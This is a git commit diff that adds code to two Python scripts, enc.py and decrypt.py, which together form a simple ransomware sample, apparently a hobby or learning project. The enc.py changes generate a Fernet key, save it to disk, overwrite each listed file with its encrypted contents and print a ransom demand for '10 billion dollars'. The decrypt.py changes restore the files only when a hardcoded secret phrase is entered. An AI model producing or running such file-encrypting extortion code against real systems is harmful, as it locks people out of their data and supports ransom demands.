53bbb2b3ce917ba3b7e6cc3c0adc844ea9226d93
sanacvn <aliaatikah12@gmail.com>
2025-10-02 12:26:25 +0700

    done enc dec

--- decrypt.py
+++ decrypt.py
@@ -17,3 +17,21 @@ print(files)
 
 with open("thekey.key", "rb") as key:
         secretkey = key.read()
+        
+secretphrase = "goated"
+                
+user_phrase =  input("Enter the secret phrase to decrypt your files\n")
+        
+if user_phrase == secretphrase:
+        for file in files:
+                with open(file, "rb") as thefile:
+                        contents = thefile.read()
+                contents_decrypted = Fernet(secretkey).decrypt(contents)
+                with open(file, "wb") as thefile:
+                        thefile.write(contents_decrypted)
+                print("congrats, you're files are decrypted , Enjoy ur coffe")
+else:
+        print("Sorry, wrong answer son.send mor billion. ")
+
+
+    
--- enc.py
+++ enc.py
@@ -17,3 +17,16 @@ print(files)
 
 
 key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+
+for file in files:
+        with open(file, "rb") as thefile:
+                contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+                thefile.write(contents_encrypted)
+print("All of your files have been encrypted! send me 10 billion dollars or ill delete them in 24 hrs")
+
+
